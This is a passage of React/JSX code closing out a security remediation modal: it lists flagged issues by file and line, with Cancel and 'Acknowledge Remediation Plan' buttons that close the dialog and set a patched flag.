            <div className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 font-mono text-zinc-300 space-y-1.5 max-h-48 overflow-y-auto">
              {securityIssues.length === 0 ? (
                <div className="text-zinc-500 text-xs">No critical security remediation actions required for this codebase.</div>
              ) : (
                securityIssues.map((iss, idx) => (
                  <div key={idx} className="flex items-center justify-between text-[11px]">
                    <span className="text-rose-400">• {iss.file}:{iss.line}</span>
                    <span className="text-zinc-500">{iss.title}</span>
                  </div>
                ))
              )}
            </div>
          </div>

          <div className="pt-2 flex items-center justify-end space-x-3">
            <button
              onClick={() => setShowRemediationModal(false)}
              className="px-4 py-2 rounded-xl bg-zinc-800 hover:bg-zinc-700 text-zinc-300 font-medium cursor-pointer"
            >
              Cancel
            </button>
            <button
              onClick={() => {
                setIsPatched(true);
                setShowRemediationModal(false);
              }}
              className="px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold flex items-center space-x-1.5 cursor-pointer shadow-md"
            >
              <Check size={14} />
              <span>Acknowledge Remediation Plan</span>
            </button>
          </div>
        </div>
      </Modal>
    </div>
  );
}
